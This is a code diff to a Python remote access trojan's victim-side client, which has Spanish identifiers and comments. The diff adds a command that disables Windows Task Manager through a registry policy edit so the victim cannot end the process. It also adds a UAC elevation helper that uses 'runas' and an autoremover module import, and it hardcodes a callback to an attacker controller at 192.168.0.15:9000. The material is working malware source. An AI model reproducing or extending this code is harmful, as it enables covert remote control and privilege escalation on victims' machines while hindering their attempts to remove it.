@@ -7,16 +7,20 @@ import sys
 import time
 import socket
 import json
+import ctypes
+import argparse
 import platform
 import subprocess
 import threading
 import urllib.request
 from getpass import getuser
 
+
 # MODULOS DE OPERACIONES
 
 import netcat 
 import modulos.persistencia as persistencia
+import modulos.autoremover as autoremover
 
 
 # PROGRAMA PRINCIPAL
@@ -121,6 +125,7 @@ class Victima(object):
 	def control_total(self):
 		while (True):
 			datosEleccion = self.recibir()
+			#print(datosEleccion)
 
 			if (datosEleccion=="matar"):
 				self.detener()
@@ -148,6 +153,9 @@ class Victima(object):
 
 			elif (datosEleccion=="autoremover"):
 				self.autoremover()
+
+			elif (datosEleccion=="taskManagerDisable"):
+				self.taskManagerDisable()
 
 			# RED	
 
@@ -217,6 +225,31 @@ class Victima(object):
 			datos = self.recibir()
 
 			#print(datos)
+
+		return
+
+	def taskManagerDisable(self):	
+
+		self.enviar('ok')
+
+		data = self.recibir()
+
+		if (data=="task_disable"):
+
+			if (plataforma=="win"):
+				os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /t REG_DWORD /d 1 /f")
+				self.enviar(" Administrador de tareas deshabilitado")
+
+			else:
+				self.enviar(" Este modulo no esta disponible.")
+
+		else:
+			if (plataforma=="win"):
+				os.system("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /f")
+				self.enviar(" Administrador de tareas habilitado")
+
+			else:
+				self.enviar(" Este modulo no esta disponible.")
 
 		return
 
@@ -362,6 +395,27 @@ class Victima(object):
 		return
 
 
+def run_as_admin(argv=None, debug=False):
+    shell32 = ctypes.windll.shell32
+    if argv is None and shell32.IsUserAnAdmin():
+        return True
+        
+    if argv is None:
+        argv = sys.argv
+    if hasattr(sys, '_MEIPASS'):
+        # Support pyinstaller wrapped program.
+        arguments = map(str, argv[1:])
+    else:
+        arguments = map(str, argv)
+    argument_line = u' '.join(arguments)
+    executable = str(sys.executable)
+    if debug:
+        print( 'Command line: ', executable, argument_line)
+    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
+    if int(ret) <= 32:
+        return False
+    return None
+
 def main(direccion,puerto):
 
 	s = Victima(direccion,puerto)	
@@ -369,10 +423,6 @@ def main(direccion,puerto):
 	s.enviar_informacion()
 	s.control_total()
 
-
 if __name__ == '__main__':
-	
-	direccion=sys.argv[1]
-	puerto=sys.argv[2]
-
-	main(direccion,puerto)
+   
+   main("192.168.0.15",9000)
